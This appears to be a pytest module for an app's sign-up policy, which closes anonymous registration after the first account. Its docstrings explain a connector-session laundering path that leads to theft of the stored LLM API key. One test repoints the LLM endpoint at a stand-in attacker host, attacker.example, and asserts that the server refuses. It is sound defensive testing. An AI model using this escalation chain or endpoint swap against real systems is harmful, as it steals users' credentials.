"""Who may create an account, and why the answer stopped being "anyone".

``POST /register`` is unauthenticated by necessity: it is how an install gets
its first account. Leaving it open afterwards was survivable only while the
server was bound to loopback, and ``docs/windows-security.md`` has listed
"registration policy" as an unbuilt prerequisite for a LAN bind since it was
written. Two concrete harms sit behind an extra account on this app:

* **The LLM settings are app-global, not per-user.** A brand-new account can
  point ``llm_endpoint`` at a host it controls and is handed the rider's stored
  API key on the next refinement call, plus every prompt payload after that.
  Revoking a device does not undo it.
* **Registering launders a connector session.**
  ``_promote_to_password_session`` drops the ``via=connector`` marker when a
  password is proven - and the password proven at /register is one the caller
  just chose. So a stolen device token became a ticket, became a session,
  registered a throwaway account, and walked past the /settings refusal that
  exists to stop precisely that.

The policy: the first account is always allowed (nothing to protect yet, and
every install bootstraps this way); after that it takes
``WATTRACKER_ALLOW_REGISTRATION``, parsed exactly like
``WATTRACKER_ALLOW_NON_LOOPBACK``.

NOTE ON THE FIXTURE: tests/conftest.py sets WATTRACKER_ALLOW_REGISTRATION=1 for
the whole suite, because dozens of tests register a second rider to exercise
per-user scoping and their subject is isolation, not sign-up policy. This
module is where the policy itself lives, so almost every test here begins by
deleting that variable again - which is also why ``closed`` is a fixture rather
than a line repeated by hand.
"""
import contextlib

import pytest

pytest.importorskip("httpx")
from fastapi.testclient import TestClient  # noqa: E402

from wattracker import config, connectorauth, db  # noqa: E402
from wattracker.server import create_app  # noqa: E402

PASSWORD = "password123"


@pytest.fixture()
def closed(monkeypatch):
    """The shipped default: no opt-in variable at all."""
    monkeypatch.delenv("WATTRACKER_ALLOW_REGISTRATION", raising=False)


@pytest.fixture()
def client():
    with TestClient(create_app()) as c:
        yield c


def _register(client, username, password=PASSWORD):
    return client.post(
        "/register", data={"username": username, "password": password}
    )


# ------------------------------------------------------- the flag itself
@pytest.mark.parametrize("raw", ["1", "true", "TRUE", "yes", "on", " On "])
def test_the_flag_accepts_the_same_truthy_spellings_as_the_bind_flag(
    monkeypatch, raw
):
    """Two opt-ins a rider will meet together must not disagree about "true".

    A flag that took "1" but silently ignored "true" would leave someone
    convinced they had enabled something they had not - and here that failure
    is quiet in the safe direction, which is precisely the kind that gets
    diagnosed as "the app is broken" and worked around by something worse.
    """
    monkeypatch.setenv("WATTRACKER_ALLOW_REGISTRATION", raw)
    monkeypatch.setenv("WATTRACKER_ALLOW_NON_LOOPBACK", raw)
    assert config.allow_registration() is True
    assert config.allow_registration() is config.allow_non_loopback()


@pytest.mark.parametrize("raw", ["", "0", "false", "no", "off", "maybe", "2"])
def test_the_flag_is_off_for_anything_else(monkeypatch, raw):
    monkeypatch.setenv("WATTRACKER_ALLOW_REGISTRATION", raw)
    monkeypatch.setenv("WATTRACKER_ALLOW_NON_LOOPBACK", raw)
    assert config.allow_registration() is False
    assert config.allow_registration() is config.allow_non_loopback()


def test_the_flag_is_off_when_unset(closed):
    assert config.allow_registration() is False


# ------------------------------------------------------ bootstrap is open
def test_the_first_account_is_always_allowed(closed, client):
    """Every install starts here, and it must work with nothing configured.

    If this ever fails the app cannot be set up at all - a fresh database has
    no account to log in with and no way to make one.
    """
    assert db.user_ids() == []

    response = _register(client, "rider")

    assert response.status_code == 200
    assert db.get_user_by_username("rider") is not None
    # Registered AND signed in, exactly as before the policy existed.
    assert client.get("/", follow_redirects=False).status_code == 200


def test_the_registration_form_is_served_on_an_empty_database(closed, client):
    assert client.get("/register").status_code == 200
    assert "Create account" in client.get("/register").text


# --------------------------------------------------- a second one is not
def test_a_second_account_is_refused_by_default(closed, client):
    """The finding, stated directly: an anonymous caller can no longer join.

    On a LAN-bound server this is the difference between "a stranger who can
    reach the port owns the app-global AI settings" and "a stranger who can
    reach the port gets a page telling them no".
    """
    assert _register(client, "rider").status_code == 200

    response = _register(client, "intruder")

    assert response.status_code == 403
    assert db.get_user_by_username("intruder") is None
    assert [u for u in db.list_usernames()] == ["rider"]


def test_the_refusal_is_a_page_that_says_how_to_turn_it_on(closed, client):
    """Not a bare 500 and not a silent redirect.

    The person who actually hits this is nearly always the owner adding a
    second rider on their own machine. Naming the variable is what keeps that
    from being filed as a bug.
    """
    _register(client, "rider")

    response = _register(client, "second")

    assert response.status_code == 403
    assert "WATTRACKER_ALLOW_REGISTRATION" in response.text
    assert "Registration is closed" in response.text
    # A page, not a stack trace or an empty body.
    assert "<form" not in response.text.split("Registration is closed")[1][:400]


def test_the_refusal_does_not_report_who_has_an_account(closed, client):
    """The message is about policy, not about inventory.

    A refusal inherently implies "at least one account exists" - that cannot be
    helped without lying. What it must not do is go further and confirm a
    guessed username, or count the accounts, to a caller who has proven nothing.
    """
    _register(client, "rider")

    response = _register(client, "rider")

    assert response.status_code == 403
    # Not "that username is taken", which would confirm the guess.
    assert "rider" not in response.text
    assert "taken" not in response.text.lower()

    # And the same page for a username nobody has - the two are indistinguishable.
    other = _register(client, "nobody")
    assert other.status_code == 403
    assert other.text == response.text


def test_the_registration_form_is_refused_too_not_just_the_post(closed, client):
    """Refusing only the POST would show a form that cannot work.

    It also matters for the connector window, which follows links: a GET that
    still renders "Create account" invites the exact flow the POST refuses.

    Asked from a SEPARATE client with no cookie: the one that registered is
    now signed in, and a signed-in caller has always been bounced to "/" by a
    check that predates this policy and says nothing about it.
    """
    _register(client, "rider")

    with TestClient(client.app) as anonymous:
        response = anonymous.get("/register", follow_redirects=False)

    assert response.status_code == 403
    assert "Registration is closed" in response.text
    assert "Create account" not in response.text


def test_the_refusal_costs_no_password_hash(closed, client, monkeypatch):
    """Refuse before scrypt, or a closed server is a free memory-burning gadget.

    Each hash reserves ~128 MiB. A route that refuses only after hashing would
    let anyone who can reach the port exhaust the shared limiter and take
    /login down with it.
    """
    from wattracker import auth

    hashed = []
    real = auth.hash_password
    monkeypatch.setattr(
        auth, "hash_password", lambda pw: (hashed.append(pw), real(pw))[1]
    )

    _register(client, "rider")
    hashed.clear()

    assert _register(client, "intruder").status_code == 403
    assert hashed == []


# ------------------------------------------------------- the opt-in works
def test_a_second_account_succeeds_with_the_variable_set(client, monkeypatch):
    """Multi-account capability survives the policy; it is gated, not removed.

    This is what the suite-wide fixture in conftest.py buys for the many tests
    whose subject is per-user isolation.
    """
    monkeypatch.setenv("WATTRACKER_ALLOW_REGISTRATION", "1")
    assert _register(client, "rider").status_code == 200

    with TestClient(client.app) as second:
        assert _register(second, "bob").status_code == 200

    assert db.list_usernames() == ["bob", "rider"]


def test_turning_the_variable_off_again_closes_it(client, monkeypatch):
    """The intended workflow: open it, add the rider, close it, restart.

    Read per request rather than cached at startup, so the test can walk the
    whole sequence - and so an operator who removes it from a service file gets
    what they asked for on the next start rather than the next release.
    """
    monkeypatch.setenv("WATTRACKER_ALLOW_REGISTRATION", "1")
    assert _register(client, "rider").status_code == 200
    with TestClient(client.app) as second:
        assert _register(second, "bob").status_code == 200

    monkeypatch.delenv("WATTRACKER_ALLOW_REGISTRATION")
    with TestClient(client.app) as third:
        assert _register(third, "carol").status_code == 403
    assert db.get_user_by_username("carol") is None


# -------------------------------------------- the connector shed, closed
def _connector_window(client, token):
    minted = client.post(
        "/api/connector/session", headers={"Authorization": f"Bearer {token}"}
    )
    assert minted.status_code == 200
    ticket = minted.json()["ticket"]
    window = TestClient(client.app)
    window.__enter__()
    landing = window.get(f"/connector/session?token={ticket}", follow_redirects=False)
    assert landing.status_code == 303, "the escalation itself must still work"
    return window


def test_a_connector_session_can_no_longer_register_its_way_out(closed, client):
    """The laundering path, walked end to end and now stopped at step one.

    device token -> ticket -> session -> POST /register -> the ``via=connector``
    marker is dropped by _promote_to_password_session -> POST /settings repoints
    the APP-GLOBAL LLM endpoint at the attacker and collects the rider's key.

    Every link after the first still exists and is still correct in isolation -
    proving a password does entitle a session to drop the marker. What changed
    is that an unauthenticated caller can no longer manufacture a password to
    prove. This test asserts the outcome at the far end (the endpoint and key
    are untouched), not just the 403, because the 403 alone would still pass
    against a build that refused the POST but had already mutated the session.
    """
    _register(client, "rider")
    uid = db.get_user_by_username("rider")["id"]
    _device_id, token = connectorauth.generate_token(uid, "Zwift PC")
    config.set_llm_settings(endpoint="anthropic", model="m", api_key="rider-key")

    window = _connector_window(client, token)
    try:
        shed = window.post(
            "/register", data={"username": "throwaway", "password": PASSWORD}
        )
        assert shed.status_code == 403
        assert db.get_user_by_username("throwaway") is None

        # The marker must still be on the session: a refused registration must
        # not have promoted anything on its way to refusing.
        repoint = window.post(
            "/settings",
            data={"ftp": "250", "llm_endpoint": "custom",
                  "llm_custom_url": "http://attacker.example/v1"},
        )
        assert repoint.status_code == 403
        assert "Sign in with your password first." in repoint.text
    finally:
        with contextlib.suppress(Exception):
            window.__exit__(None, None, None)

    assert config.load_config().llm_endpoint == "anthropic"
    assert config.load_config().api_key == "rider-key"


def test_the_shed_still_works_when_the_owner_has_opted_in(client, monkeypatch):
    """Honesty about what the opt-in costs, so nobody enables it uninformed.

    With WATTRACKER_ALLOW_REGISTRATION set, the laundering path is open again -
    that is inherent in allowing anonymous registration at all, and it is why
    the flag exists rather than the route simply being reopened. Pinning it
    here means the trade-off is a documented, tested property instead of a
    surprise found later by someone who left the variable on.
    """
    monkeypatch.setenv("WATTRACKER_ALLOW_REGISTRATION", "1")
    _register(client, "rider")
    uid = db.get_user_by_username("rider")["id"]
    _device_id, token = connectorauth.generate_token(uid, "Zwift PC")

    window = _connector_window(client, token)
    try:
        assert window.post(
            "/register", data={"username": "throwaway", "password": PASSWORD}
        ).status_code == 200
        assert db.get_user_by_username("throwaway") is not None
    finally:
        with contextlib.suppress(Exception):
            window.__exit__(None, None, None)
